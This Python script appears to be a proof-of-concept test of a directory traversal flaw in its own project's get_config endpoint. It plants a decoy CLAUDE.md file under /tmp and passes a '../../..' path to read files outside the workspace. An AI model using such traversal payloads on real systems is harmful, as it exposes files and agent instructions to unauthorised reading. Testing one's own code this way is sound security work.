import sys
import asyncio
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent))

from backend.main import get_config

async def run():
    # 1. Setup a "victim" directory completely outside the workspace (e.g. /tmp/victim_project)
    victim_dir = Path("/tmp/victim_project")
    victim_dir.mkdir(parents=True, exist_ok=True)
    
    # 2. Put some "sensitive" agent instructions in it
    (victim_dir / "CLAUDE.md").write_text("SUPER SECRET INSTRUCTIONS: DO NOT SHARE THIS")
    
    # 3. Simulate an XSS payload or malicious script passing a relative path 
    # that escapes the current directory (Directory Traversal)
    malicious_project_path = "../../../../../../tmp/victim_project"
    
    print(f"Attempting to read config with project path: {malicious_project_path}")
    
    # 4. Call the vulnerable endpoint
    result = await get_config(project=malicious_project_path)
    
    # 5. Extract what the endpoint leaked
    memory_items = result.get("memory", []) if isinstance(result, dict) else []
    
    # Print out any project-scoped memory it found
    found = False
    for item in memory_items:
        if item.get("scope") == "project":
            print("\n--- 🚨 VULNERABILITY SUCCESS 🚨 ---")
            print("The backend blindly trusted the path and read files outside the workspace!")
            print(f"File Read: {item.get('source')}")
            print(f"Leaked Content: {item.get('preview')}")
            found = True
            break
            
    if not found:
        print("Failed to exploit. The path was protected.")

if __name__ == "__main__":
    asyncio.run(run())
